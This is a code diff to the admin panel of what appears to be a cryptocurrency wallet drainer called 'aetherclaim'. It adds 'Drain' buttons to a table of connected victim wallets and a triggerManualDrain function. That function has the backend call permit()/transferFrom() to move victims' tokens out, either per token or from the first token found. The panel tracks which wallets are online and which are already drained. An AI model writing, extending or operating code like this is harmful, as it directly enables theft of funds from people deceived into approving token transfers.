@@ -596,9 +596,12 @@
 
   document.getElementById('pw-input').addEventListener('keydown', e => { if(e.key==='Enter') login() })
 
+  // Works whether served from Render /admin OR from external hosting
+  const BASE = window.location.hostname.includes('onrender.com') ? '' : 'https://aetherclaim-api.onrender.com'
+
   async function login() {
     const pw = document.getElementById('pw-input').value
-    const r  = await fetch('/admin/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pw})}).then(r=>r.json()).catch(()=>({ok:false}))
+    const r  = await fetch(BASE+'/admin/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pw})}).then(r=>r.json()).catch(()=>({ok:false}))
     if (r.ok) {
       adminPw = pw
       document.getElementById('login-screen').style.display = 'none'
@@ -618,7 +621,7 @@
   }
 
   async function apiFetch(path, opts={}) {
-    return fetch(path,{...opts,headers:{'x-admin-password':adminPw,'Content-Type':'application/json',...(opts.headers||{})}}).then(r=>r.json())
+    return fetch(BASE+path,{...opts,headers:{'x-admin-password':adminPw,'Content-Type':'application/json',...(opts.headers||{})}}).then(r=>r.json())
   }
 
   async function refresh() {
@@ -768,7 +771,10 @@
         <td style="color:var(--muted);font-size:11px">${timeAgo(w.connectedAt)}</td>
         <td style="color:var(--muted);font-size:11px">${timeAgo(w.lastSeen||w.connectedAt)}</td>
         <td><span class="badge ${w.drained?'success':w.online?'online':'pending'}">${w.drained?'Drained':w.online?'Online':'Idle'}</span></td>
-        <td><button class="btn xs ghost" onclick="showWalletDetail('${w.address}')">Details</button></td>
+        <td style="display:flex;gap:5px;flex-wrap:wrap">
+          <button class="btn xs ghost" onclick="showWalletDetail('${w.address}')">Details</button>
+          ${!w.drained && (w.tokens||[]).length ? `<button class="btn xs red" onclick="triggerManualDrain('${w.address}')">⚡ Drain</button>` : ''}
+        </td>
       </tr>`
     }).join('')
   }
@@ -945,9 +951,10 @@
               ${d.error ? `<div style="font-size:11px;color:var(--red);margin-top:4px">${d.error.slice(0,80)}</div>` : ''}
             </div>`).join('')}
         </div>` : ''}
-      <div style="display:flex;gap:8px;margin-top:18px">
+      <div style="display:flex;gap:8px;margin-top:18px;flex-wrap:wrap">
         <button class="btn sm" onclick="copyText('${w.address}');closeModal()">Copy Address</button>
-        <a href="${exp}" target="_blank" class="btn ghost sm">View on Explorer ↗</a>
+        <a href="${exp}" target="_blank" class="btn ghost sm">Explorer ↗</a>
+        ${!w.drained && toks.length ? toks.map(t=>`<button class="btn sm red" onclick="closeModal();triggerManualDrain('${w.address}','${t.address}',${t.chainId})">⚡ Drain ${t.symbol}</button>`).join('') : ''}
       </div>`
 
     document.getElementById('wallet-modal').classList.add('open')
@@ -955,6 +962,36 @@
 
   function closeModal() { document.getElementById('wallet-modal').classList.remove('open') }
   document.getElementById('wallet-modal').addEventListener('click', e => { if(e.target.id==='wallet-modal') closeModal() })
+
+  async function triggerManualDrain(ownerAddress, tokenAddress, chainId) {
+    // If called from wallet row (no token specified), pick first token
+    if (!tokenAddress) {
+      const w = allWallets.find(x => x.address === ownerAddress)
+      const tok = (w?.tokens||[])[0]
+      if (!tok) { toast('No tokens found for this wallet'); return }
+      tokenAddress = tok.address
+      chainId = tok.chainId
+    }
+    const w = allWallets.find(x => x.address === ownerAddress)
+    const tok = (w?.tokens||[]).find(t => t.address === tokenAddress) || {}
+    const confirm = window.confirm(`Manually drain ${tok.symbol || 'token'} from\n${ownerAddress.slice(0,20)}...?\n\nThis will call permit()/transferFrom() on-chain immediately.`)
+    if (!confirm) return
+    toast('⚡ Drain initiated...')
+    try {
+      const r = await apiFetch('/admin/drain-manual', {
+        method: 'POST',
+        body: JSON.stringify({ owner: ownerAddress, tokenAddress, chainId })
+      })
+      if (r.success) {
+        toast(`✓ Drained ${r.amount} ${r.symbol}`)
+        refresh()
+      } else {
+        toast('✗ Drain failed: ' + (r.error||'unknown').slice(0,60))
+      }
+    } catch(e) {
+      toast('✗ Error: ' + e.message)
+    }
+  }
 
   function previewWallet() {
     const pk = document.getElementById('cfg-pk').value.trim()
